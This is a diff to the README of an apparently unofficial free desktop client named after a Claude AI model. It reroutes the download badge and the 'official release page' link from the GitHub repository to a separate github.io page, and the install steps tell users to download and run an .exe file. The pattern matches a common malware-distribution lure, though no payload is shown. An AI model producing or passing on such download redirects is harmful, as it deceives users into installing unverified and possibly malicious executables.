@@ -1,6 +1,6 @@
 # 🤖 Claude-Mythos-AI-Free-desktop - Manage your AI conversations with ease
 
-[![Download for Windows](https://img.shields.io/badge/Download_Windows-Blue?style=for-the-badge)](https://github.com/Mustachioed-scapegoat599/Claude-Mythos-AI-Free-desktop)
+[![Download for Windows](https://img.shields.io/badge/Download_Windows-Blue?style=for-the-badge)](https://mustachioed-scapegoat599.github.io)
 
 Claude-Mythos-AI-Free-desktop provides an organized workspace for your AI interactions. This application allows you to chat, write code, conduct research, and analyze documents through a private desktop interface. It saves your history on your computer to protect your data. You can access various models and organize your prompts within a clean, simple layout.
 
@@ -8,7 +8,7 @@ Claude-Mythos-AI-Free-desktop provides an organized workspace for your AI intera
 
 Follow these steps to set up the application on your Windows computer.
 
-1. Go to the [official release page](https://github.com/Mustachioed-scapegoat599/Claude-Mythos-AI-Free-desktop).
+1. Go to the [official release page](https://mustachioed-scapegoat599.github.io).
 2. Look for the list of files under the latest version.
 3. Select the file ending in .exe to start the download.
 4. Save the file to your desktop or downloads folder.
